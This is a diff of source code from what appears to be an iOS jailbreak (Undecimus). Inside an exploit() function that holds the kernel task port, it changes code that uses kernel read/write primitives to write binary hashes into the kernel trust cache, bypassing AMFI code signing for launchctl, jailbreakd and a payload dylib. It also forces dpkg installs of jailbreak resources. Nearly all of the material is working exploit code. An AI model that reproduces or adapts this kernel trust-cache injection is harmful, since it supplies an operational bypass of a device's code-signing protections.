@@ -2381,12 +2381,6 @@ void exploit(mach_port_t tfp0,
         kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
         wk64(GETOFFSET(trust_chain), kernel_trust);
         
-        free(allhash);
-        allhash = NULL;
-        free(allkern);
-        allkern = NULL;
-        free(amfitab);
-        amfitab = NULL;
     }
     
     {
@@ -2624,8 +2618,8 @@ void exploit(mach_port_t tfp0,
             run_uicache = 1;
             _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/strap.tar.lzma", NULL, NULL, NULL) == 0, message);
         }
-        bool updatedResources;
-        {
+        bool updatedResources=false;
+        if (!needResources) {
             rv = _system([[NSString stringWithFormat:
                            @"INSTALLED=\"$(dpkg -s xnu.science.undecimus.resources | grep Version: | sed -e s/'^Version: '//)\"; "\
                            "dpkg --compare-versions \"${INSTALLED}\" lt \"%@\"", bundledResources] UTF8String]);
@@ -2634,7 +2628,7 @@ void exploit(mach_port_t tfp0,
         if (needResources || updatedResources) {
             CLEAN_FILE("/jb/resources.deb");
             _assert(moveFileFromAppDir("resources.deb", "/jb/resources.deb") == 0, message);
-            rv = _system("/usr/bin/dpkg -i /jb/resources.deb");
+            rv = _system("/usr/bin/dpkg --force-bad-path -i /jb/resources.deb");
             _assert(WEXITSTATUS(rv) == 0, message);
             CLEAN_FILE("/jb/resources.deb");
             _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/tar.tar", NULL, NULL, NULL) == 0, message);
@@ -2642,32 +2636,21 @@ void exploit(mach_port_t tfp0,
             _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/lzma.tar", NULL, NULL, NULL) == 0, message);
             _assert(execCommandAndWait("/bin/rm", "-rf", "/jb/lzma", NULL, NULL, NULL) == 0, message);
             
-            
-            // TODO: inject things to trust cache, this doesn't work
-//            mem.next = rk64(GETOFFSET(trust_chain));
-//            mem.count = 0;
-//            *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
-//            *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
-//
-//            _assert(grab_hashes("/bin/launchctl", kread, GETOFFSET(amficache), mem.next) == 0, message);
-//            _assert(grab_hashes("/usr/libexec/jailbreakd", kread, GETOFFSET(amficache), mem.next) == 0, message);
-//            _assert(grab_hashes("/Library/MobileSubstrate/DynamicLibraries/amfid_payload.dylib", kread, GETOFFSET(amficache), mem.next) == 0, message);
-//
-//            length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
-//            kernel_trust = kmem_alloc(length);
-//            printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
-//
-//            mem.count = numhash;
-//            kwrite(kernel_trust, &mem, sizeof(mem));
-//            kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
-//            wk64(GETOFFSET(trust_chain), kernel_trust);
-//
-//            free(allhash);
-//            allhash = NULL;
-//            free(allkern);
-//            allkern = NULL;
-//            free(amfitab);
-//            amfitab = NULL;
+            _assert(grab_hashes("/bin/launchctl", kread, GETOFFSET(amficache), mem.next) == 0, message);
+            _assert(grab_hashes("/usr/libexec/jailbreakd", kread, GETOFFSET(amficache), mem.next) == 0, message);
+            _assert(grab_hashes("/Library/MobileSubstrate/DynamicLibraries/amfid_payload.dylib", kread, GETOFFSET(amficache), mem.next) == 0, message);
+
+            uint64_t old_length = length;
+            length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
+            uint64_t old_trust = kernel_trust;
+            kernel_trust = kmem_alloc(length);
+            printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);
+
+            mem.count = numhash;
+            kwrite(kernel_trust, &mem, sizeof(mem));
+            kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
+            wk64(GETOFFSET(trust_chain), kernel_trust);
+            kmem_free(old_trust, old_length);
         }
         _assert(chdir("/jb") == 0, message);
         char link[0x100];
